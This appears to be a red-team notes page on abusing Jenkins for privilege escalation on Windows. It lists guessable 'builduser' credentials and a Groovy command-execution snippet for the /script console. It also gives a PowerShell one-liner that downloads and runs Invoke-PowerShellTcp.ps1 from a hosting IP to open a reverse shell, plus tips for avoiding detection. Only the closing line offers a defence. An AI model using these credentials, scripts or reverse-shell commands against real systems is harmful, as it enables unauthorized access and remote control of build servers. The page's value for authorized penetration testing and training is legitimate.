Features abuse are awesome as there are seldom patches for them and
they are not the focus of security teams!

 One of my favourite features abuse is targeting enterprise applications
which are not built keeping security in mind.

On Windows, many enterprise applications need either Administrative
privileges or SYSTEM privileges making them a great avenue for privilege
escalation.

### Jenkins
If you you see a user like `builduser` in the user list try the following credentials
```
    builduser: <null>
    builduser:builduser
    builduser:resudilub
    builduser:resudilub!
```

With Jenkins Admin creds you can go to `/script` and run the following
```groovy
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '[COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

No Admin creds, but can add or edit build steps in the build configuration.

Add a "Execute Windows Batch command" build step and catch a reverse shell
```powershell
powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress 172.16.100.1 -Port 443
```

1. Create a local firewall rule to allow the hosting of a webserver
2. Host the web server using HFS or python

**In real redteam engagements don't drop a reverse shell or even the stage 1 payload. Start off with a stage zero payload that beacons and quietly enumerates to see if the target is heavily protected**


> [!NOTE] **IMPORTANT**
> `whoami` and `hostname` is very noisy
> use `$env:Username` and `ls env:` instead

One way to protect an enterprise application is to expose it to the internet via a Azure Proxy, make everyone authenticate using Entra ID and use a whitelist for people allowed to use it